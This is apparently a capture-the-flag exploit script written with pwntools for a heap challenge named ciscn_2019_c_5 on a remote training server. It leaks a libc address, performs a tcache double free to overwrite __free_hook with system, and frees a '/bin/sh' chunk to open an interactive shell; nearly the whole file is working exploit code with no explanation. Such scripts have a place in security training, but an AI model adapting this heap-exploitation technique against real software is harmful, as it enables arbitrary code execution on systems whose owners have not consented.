#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/28 21:44:20
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
import inspect
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./ciscn_2019_c_5"
menu = "Input your choice:"
if context.arch == "amd64":
    # libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    # one_offset = [0x4f3d5,0x4f432,0x10a41c]
    libc_path = "../../libc/libc-2.27.so"
    one_offset = [0x4f2c5,0x4f322,0x10a38c]
else:
    # libc_path = "~/Desktop/pwn/libc/libc-2.27-32.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        sh = process([file_name],env={'LD_PRELOAD':libc_path})
        # sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 28279
    sh = remote(IP,port)

def debug():
    gdb.attach(sh)
    pause()

def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Please input the size of story: \n")
    sh.sendline(str(size))
    sh.recvuntil("please inpute the story: \n")
    sh.send(content)

def dele(idx):
    cmd(4)
    sh.recvuntil("Please input the index:\n")
    sh.sendline(str(idx))

sh.recvuntil("What's your name?\n")
sh.send('a'*0x20)
sh.recvuntil("Please input your ID.\n")
sh.send('a'*8)
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,b"\x00")) - 0x81237
log.info("libc_base=>{}".format(hex(libc_base)))
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
# debug()
add(0x80,'/bin/sh\x00') #0
add(0x80,'a')
dele(1)
dele(1)
add(0x80,p64(free_hook)) #1
add(0x80,"aaaaaaaa") #2
add(0x80,p64(system)) #2
dele(0)
sh.interactive()